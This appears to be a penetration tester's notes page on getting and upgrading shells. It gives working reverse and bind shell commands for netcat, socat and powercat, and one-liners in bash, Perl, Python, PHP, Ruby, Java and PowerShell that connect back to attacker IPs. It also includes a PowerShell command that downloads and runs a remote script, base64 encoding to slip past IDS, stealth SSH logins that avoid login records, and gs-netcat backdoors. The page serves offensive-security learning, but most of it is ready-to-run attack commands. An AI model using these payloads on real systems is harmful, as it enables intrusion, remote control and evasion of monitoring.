# Shells

## Shell Guides and Resources

{% tabs %}
{% tab title="Shell Cheatsheets" %}
* [PayloadsAllTheThings/ReverseShellCheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [Pentest monkey Rshell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)&#x20;
* [CTF Notes Reverse shell cheatsheet](https://github.com/Shiva108/CTF-notes/blob/master/rvshell\_cheatsheet.html)&#x20;
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
{% endtab %}

{% tab title="Spawning a TTY Shell" %}
### [Spawning a TTY Shell](https://netsec.ws/?p=337)
{% endtab %}

{% tab title="Upgrading a Shell" %}
### **Upgrading a shell**

****[**https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/**](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)****

**Reverse shell Upgrade to Fully interactive - Linux**&#x20;

* Method 1&#x20;
  * Simply add 2&>1 to the end of the command&#x20;
* Method 2&#x20;
  * (Victim) # python -c "import pty; pty.spawn('/bin/bash')"&#x20;
  * (Victim # export TERM=xterm&#x20;
  * (Victim) -Now Ctrl + z to background your reverse shell&#x20;
  * (Attacker) # stty raw -echo; fg&#x20;
  * (Victim) # reset&#x20;
  * _\*_If looks wonky&#x20;
    * (Attacker) # stty size&#x20;
    * (Victim) # stty -rows \[#] -columns \[#]&#x20;
* Method 3&#x20;
  * \#sudo apt install rlwrap&#x20;
  * \# rlwrap nc -lvnp&#x20;
  * \# stty raw -echo; fg&#x20;
* Method 4&#x20;
  * Use Socat
* [https://netsec.ws/?p=337](https://netsec.ws/?p=337)
* [https://xapax.github.io/security/#post\_exploitation/spawning\_shells/](https://xapax.github.io/security/#post\_exploitation/spawning\_shells/)
* [https://pentestmonkey.net/blog/post-exploitation-without-a-tty](https://pentestmonkey.net/blog/post-exploitation-without-a-tty)
{% endtab %}
{% endtabs %}

## **Shells**

<details>

<summary>Shell Collections</summary>

* Impacket remote execution scripts
  * [psexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/psexec.py) PSEXEC like functionality example using [RemComSvc](https://github.com/kavika13/RemCom)&#x20;
  * [smbexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/smbexec.py) A similar approach to PSEXEC w/o using RemComSvc. The technique is described [here](https://web.archive.org/web/20140625065218/http://blog.accuvant.com/rdavisaccuvant/owning-computers-without-shell-access/). Our implementation goes one step further, instantiating a local smbserver to receive the output of the commands. This is useful in the situation where the target machine does NOT have a writeable share available.
  * [atexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/atexec.py) This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
  * [wmiexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/wmiexec.py) A semi-interactive shell, used through Windows Management Instrumentation. It does not require to install any service/agent at the target server. Runs as Administrator. Highly stealthy.
  * [dcomexec.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/dcomexec.py) A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. Currently supports MMC20.Application, ShellWindows and ShellBrowserWindow objects.
* [BlackArch Web Shells](https://github.com/BlackArch/webshells) - Shell collection included in the BlackArch Linux Distrobution
* [Python PTY shells](https://github.com/infodox/python-pty-shells) - Collection of full PTY shells in python
* [AlphaSecLabs Webshell collection](https://github.com/alphaSeclab/awesome-webshell/blob/master/Readme\_en.md)
* [https://xapax.github.io/security/#tools/webshell/](https://xapax.github.io/security/#tools/webshell/)
* _Operator Handbook: Reverse Shells - pg. 267_

</details>

<details>

<summary>Misc Shells and Tools</summary>

* [dbd](https://www.kali.org/tools/dbd/) - dbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. dbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features.
* [sbd](https://www.kali.org/tools/sbd/) - sbd is a Netcat-clone, designed to be portable and offer strong encryption. It runs on Unix-like operating systems and on Microsoft Win32. sbd features AES-CBC-128 + HMAC-SHA1 encryption (by Christophe Devine), program execution (-e option), choosing source port, continuous reconnection with delay, and some other nice features. sbd supports TCP/IP communication only.
* [Reverse Shell and Post Exploitation tool](https://github.com/panagiks/RSPET) - RSPET (Reverse Shell and Post Exploitation Tool) is a Python based reverse shell equipped with functionalities that assist in a post exploitation scenario.
* [Reverse Shell Generator](https://github.com/mthbernardes/rsg) - Cheater tool to generate reverse shell one liners
* [ShellPop](https://github.com/0x00-0x00/shellpop) - With this tool you can generate easy and sophisticated reverse or bind shell commands to help you during penetration tests.
* [SQL webshell](https://github.com/NetSPI/cmdsql) - Webshell that can run command line actions on the target as well as interact with an MSSQL database on the target.
  * [https://www.netspi.com/blog/technical/network-penetration-testing/adding-powershell-to-web-shells-to-get-database-access/](https://www.netspi.com/blog/technical/network-penetration-testing/adding-powershell-to-web-shells-to-get-database-access/)
* [Shellerator](https://github.com/ShutdownRepo/shellerator) - Simple CLI tool for the generation of bind and reverse shells in multiple languages
* [donut](https://github.com/TheWover/donut) - Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters
  * [golang-github-binject-go-donut](https://www.kali.org/tools/golang-github-binject-go-donut/) - This package contains the Donut Injector ported to pure Go.
* [ibombshell](https://www.kali.org/tools/ibombshell/) - This package contains a tool written in Powershell that allows you to have a prompt at any time with post-exploitation functionalities (and in some cases exploitation).
  * [https://github.com/Telefonica/ibombshell](https://github.com/Telefonica/ibombshell)
* [Weevly webshell ](https://github.com/epinna/weevely3)- Weevely is a web shell designed for post-exploitation purposes that can be extended over the network at runtime.
  * [https://www.youtube.com/watch?v=Ig-HS6kxz4Q](https://www.youtube.com/watch?v=Ig-HS6kxz4Q)
* [PyShell](https://github.com/JoelGMSec/PyShell) - Multiplatform Python WebShell. This tool helps you to obtain a shell-like interface on a web server to be remotely accessed. Unlike other webshells, the main goal of the tool is to use as little code as possible on the server side, regardless of the language used or the operating system of the server.
  * [https://www.kitploit.com/2022/03/pyshell-multiplatform-python-webshell.html?m=1](https://www.kitploit.com/2022/03/pyshell-multiplatform-python-webshell.html?m=1)
* [SharPyShell](https://github.com/antonioCoco/SharPyShell) - tiny and obfuscated ASP.NET webshell for C# web applications

</details>

<details>

<summary>SSH</summary>

* Basic Use: #ssh \[user]@\[host]&#x20;
* Use a specific key and port: #ssh -i \~/.ssh/id\_rsa -p \[port] \[user]@\[host]&#x20;
* SOCKS proxy: ssh -D8080 \[user]@\[host]&#x20;
* Execute a one line command : ssh -i \~/.ssh/id\_rsa \[user]@\[host] “_command string_”&#x20;
* Local Port Forward: ssh -L \[bindaddr]:\[port]:\[dsthost]:\[dstport] \[user]@\[host]&#x20;
* Remote Port Forward:ssh -R \[bindaddr]:\[port]:\[localhost]:\[localport] \[user]@\[host]&#x20;
* SSH tunnel through T1 to T2:ssh \[user]@\[T1 IP] -L \[Local LPORT]:\[T2 IP]:\[T2 LPORT] -R \[Local LPORT 2]:\[Local IP]:\[T1 LPORT]&#x20;
*   **Almost invisible SSH**

    ```
    ssh -o UserKnownHostsFile=/dev/null -T user@server.org "bash -i"
    ```

    This will not add your user to the _/var/log/utmp_ file and you won't show up in _w_ or _who_ command of logged in users. It will bypass .profile and .bash\_profile as well. On your client side it will stop logging the host name to _\~/.ssh/known\_hosts_.
*   **SSH tunnel OUT**

    We use this all the time to circumvent local firewalls and IP filtering:

    ```
    ssh -g -L31337:1.2.3.4:80 user@server.org
    ```

    You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'server.org'. An alternative and without the need for a server is to use [gs-netcat](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#bdra-anchor).
*   &#x20;**SSH tunnel IN**

    We use this to give access to a friend to an internal machine that is not on the public Internet:

    ```
    ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@server.org
    ```

    Anyone connecting to server.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer. An alternative and without the need for a server is to use [gs-netcat](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#bdra-anchor).
*   **SSH socks4/5 OUT**

    OpenSSH 7.6 adds socks support for dynamic forwarding. Example: Tunnel all your browser traffic through your server.

    ```
    ssh -D 1080 user@server.org
    ```

    Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through _server.org_ and will appear with the source IP of _server.org_. An alternative and without the need for a server is to use [gs-netcat](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#bdra-anchor).
*   **SSH socks4/5 IN**

    This is the reverse of the above example. It give others access to your _local_ network or let others use your computer as a tunnel end-point.

    ```
    ssh -g -R 1080 user@server.org
    ```

    The others configuring server.org:1080 as their SOCKS4/5 proxy. They can now connect to _any_ computer on _any port_ that your computer has access to. This includes access to computers behind your firewall that are on your local network. An alternative and without the need for a server is to use [gs-netcat](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet#bdra-anchor).

</details>

<details>

<summary><a href="http://netcat.sourceforge.net/">Netcat - The original shell tool.</a></summary>

* Reference
  * [SANS netcat cheatsheet](https://www.sans.org/security-resources/sec560/netcat\_cheat\_sheet\_v1.pdf)
  * [Netcat: All you need to know](https://blog.ikuamike.io/posts/2021/netcat/)
* Set Listener&#x20;
  * \# nc -nlvp \[port]
* Connect to port&#x20;
  * \# nc -nv \[ip] \[port]&#x20;
* Push a file over netcat&#x20;
  * \#nc -nv \[ip] \[port] < /full/path/to/file.exe&#x20;
* Catch a pushed file and write it to new file&#x20;
  * \#nc -nvlp \[port] > incoming.exe&#x20;
* Launch command upon connection&#x20;
  * \#nc -nlvp \[port] -e cmd.exe&#x20;
* **\***UPGRADE Non interactive shell_**\*\***_&#x20;
  * &#x20;Check python version in /usr/bin&#x20;
  * \# python2.6 -c "import pty; pty.spawn('/bin/bash')"&#x20;
* Reverse shell
  * TARGET # nc \[ip] \[port] -e /bin/bash&#x20;
  * ATTACKER # nc -n -vv -l -p \[port]&#x20;
* Netcat with GAPING \_SECURITY\_HOLE\_disabled&#x20;
  * When you dont have access to the -e option (execute command after connect), backpipe commands from file system from netcat back into bin/bash&#x20;
  * TARGET # mknod backpipe p && nc \[ip] \[port] 0\<backpipe | /bin/bash 1>backpipe&#x20;
  * ATTACKER # nc -n -vv -l -p \[port]&#x20;
* Netcat without netcat (/dev/tcp)&#x20;
  * TARGET # /bin/bash -i > /dev/tcp/\[IP]/\[port] 0<&1 2>&1&#x20;
  * ATTACKER # nc -n -vv -l -p \[port] • netcat without netcat or /dev/tcp&#x20;
  * TARGET # mknod backpipe p && telnet \[ip] \[port] 0\<backpipe | /bin/bash 1>backpipe&#x20;
  * ATTACKER # nc -n -vv -l -p \[port]&#x20;
* Linux listener bind shell, executes bin bash on connection&#x20;
  * \#mkfifo /tmp/f; nc -lvnp  < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
* _Operator Handbook: Netcat - pg. 209_

</details>

{% embed url="https://youtu.be/KlzSBk7VMss" %}

<details>

<summary><a href="http://manpages.org/socat">Socat - The upgraded and encryptable Netcat</a></summary>

### ****[**Socat**](http://manpages.org/socat) **-** The upgraded and encryptable Netcat

* [https://github.com/3ndG4me/socat](https://github.com/3ndG4me/socat) - Socat standalone binary collection
* Socat - establishes two bidirectional btye streams and transfers data between them&#x20;
* Bind shell - Linux connect to IP and Port
  * \# socat TCP:\[ip]:\[port] EXEC: “bash -li”,pty,stderr,sigint,setsid,sane&#x20;
* Bind shell - Windows connect to IP and Port
  * \# socat TCP:\[ip]:\[port] EXEC:powershell.exe,pipes&#x20;
* Sets listener on port
  * \# socat TCP-L:\[port]&#x20;
* Sets listener with stable shell
  * \# socat TCP-L:\[port] FILE:`tty`,raw,echo=0
* Shares file on port&#x20;
  * \# socat TCP-L:\[port],fork file:\[file name]&#x20;
* Encrypted shell&#x20;
  * Uses open ssl to create a self signed cert and encrypt
  * \# openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt&#x20;
  * \# cat shell.key shell.crt > shell.pem&#x20;
  * Reverse shell
    * \#sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,FILE:`tty`,raw,echo=0    &#x20;
  * Reverse listener
    * \#sudo socat OPENSSL:\[ip]:\[port], verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane                    &#x20;
  * Bind shell
    * \#socat OPENSSL-LISTEN:,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes      - Target
    * \#socat OPENSSL::,verify=0 -                                                                                -Attacker
* [https://www.hackingarticles.in/socat-for-pentester/](https://www.hackingarticles.in/socat-for-pentester/)

</details>

<details>

<summary><a href="https://github.com/besimorhino/powercat">Powercat - Netcat: The powershell version. </a></summary>

### [**Powercat**](https://github.com/besimorhino/powercat) **** - Netcat: The powershell version. (Powershell Version 2 and Later Supported)

* Powershell enableing&#x20;
  * When presented with a User Account Control prompt, select Yes and enter Set-ExecutionPolicy Unrestricted:&#x20;
* Script we can download to a windows host to leverage Powershell and simplify shells&#x20;
* Install on linux &#x20;
  * \#apt install powercat&#x20;
  * places in /usr/share/windows-resources/powercat&#x20;
* Set up&#x20;
  * With the script on the target host, we start by using a PowerShell feature known as Dot-sourcing to load the powercat.ps1 script. This will make all variables and functions declared in the script available in the current PowerShell scope. In this way, we can use the powercat function directly in PowerShell instead of executing the script each time.&#x20;
    * \>. .\powercat.ps1&#x20;
  * If the target machine is connected to the internet we can do the same with a remote script by once again using the handy iex cmdlet&#x20;
    * \> iex (New-Object System.Net.Webclient).DownloadString('[https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1](https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1)')&#x20;
* Powercat file transfers&#x20;
  * Set up a listener on Attackers Kali instance&#x20;
    * \# sudo nc -lnvp 443 > receiving\_powercat.ps1&#x20;
  * Invoke power cat on sending windows machine&#x20;
    * \> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1&#x20;
    * \-c specifies client mode and sets listening address&#x20;
    * \-p is the destination port
    * &#x20;\-i indicates the local file that will be transferred remotely&#x20;
* Reverse shells&#x20;
  * \> powercat -c \[dest ip] -p \[dest port] -e cmd.exe&#x20;
* Bind shells - listener&#x20;
  * \> powercat -l -p \[listener port] -e cmd.exe&#x20;
* Stand Alone Payloads&#x20;
  * Saving the powercat functionality and given commands as a script&#x20;
  * \> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1&#x20;
  * \> ./reverseshell.ps1&#x20;
  * **Warning: these scripts are rather large and have hard coded strings that will set off IDS\***&#x20;
    * Powershell can execute Base64 encoded commands&#x20;
    * We can use the -ge option when redirecting to an output file.&#x20;
    * \> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1&#x20;
    * Due to the way powershell works, you cannot execute the new script as is but you must run its contents&#x20;
    * \> powershell.exe -E \[encoded command string]
* [https://www.hackingarticles.in/powercat-for-pentester/](https://www.hackingarticles.in/powercat-for-pentester/)

</details>

### [pwncat](https://www.kali.org/tools/pwncat/)&#x20;

This package contains Netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (PSE).

### [gsocket](https://github.com/hackerschoice/gsocket)

Connect like there is no firewall. Securely. The Global Socket Tookit allows two users behind NAT/Firewall to establish a TCP connection with each other. Securely. More on [https://www.gsocket.io](https://www.gsocket.io).

<details>

<summary>gsocket resources</summary>

The Global Socket Toolkit comes with a set of tools:

* **gsocket** - Makes an existing program (behind firewall or NAT) accessible from anywhere in the world. It does so by analyzing the program and replacing the IP-Layer with its own Gsocket-Layer. A client connection to a hostname ending in _'\*.gsocket'_ then gets automatically redirected (via the GSRN) to this program.
* **gs-netcat** - Netcat on steroids. Turn gs-netcat into an AES-256 encrypted reverse backdoor via TOR (optional) with a true PTY/interactive command shell (`gs-netcat -s MySecret -i`), integrated file-transfer, spawn a Socks4/4a/5 proxy or forward TCP connections or give somebody temporary shell access.
* **gs-sftp** - sftp server & client between two firewalled workstations (`gs-sftp -s MySecret`)
* **gs-mount** - Access and mount a remote file system (`gs-mount -s MySecret ~/mnt/warez`)
* **blitz** - Copy data from workstation to workstation (`blitz -s MySecret /usr/share/*`)
* ...many more examples and tools.
* **Reverse shell with gs-netcat**

Use [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. It uses 'password hashes' instead of IP addresses to connect. This means that you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is a swiss army knife than gs-netcat is a german battle axe :>

```
gs-netcat -s MySecret -l -i    # Host
```

Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.

To connect to the shell from your workstation:

```
gs-netcat -s MySecret -i
```

Use -T to tunnel trough TOR.

</details>

#### Shell One-Liners

<details>

<summary>Shell One-Liners</summary>

* Bash&#x20;
  * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1&#x20;

<!---->

* Netcat with out -e flag&#x20;
  * \#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f&#x20;

<!---->

* Netcat&#x20;
  * \#nc -e /bin/sh 10.10.10.10 4443&#x20;

<!---->

* Netcat windows&#x20;
  * \#nc -e cmd.exe 10.10.10.10 4443&#x20;

<!---->

* Perl&#x20;
  * perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">\&S");open(STDOUT,">\&S");open(STDERR,">\&S");exec("/bin/sh -i");};'&#x20;

<!---->

* Python&#x20;
  * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"]);'&#x20;

<!---->

* PHP&#x20;
  * php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'&#x20;

<!---->

* Ruby&#x20;
  * ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'&#x20;

<!---->

* Java&#x20;
  * r = Runtime.getRuntime()&#x20;
  * p = r.exec(\["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String\[])&#x20;
  * p.waitFor()&#x20;

<!---->

* Powershell - reverse shell&#x20;
  * \>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"&#x20;

<!---->

* Powershell Bind shell&#x20;
  * \>powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

</details>
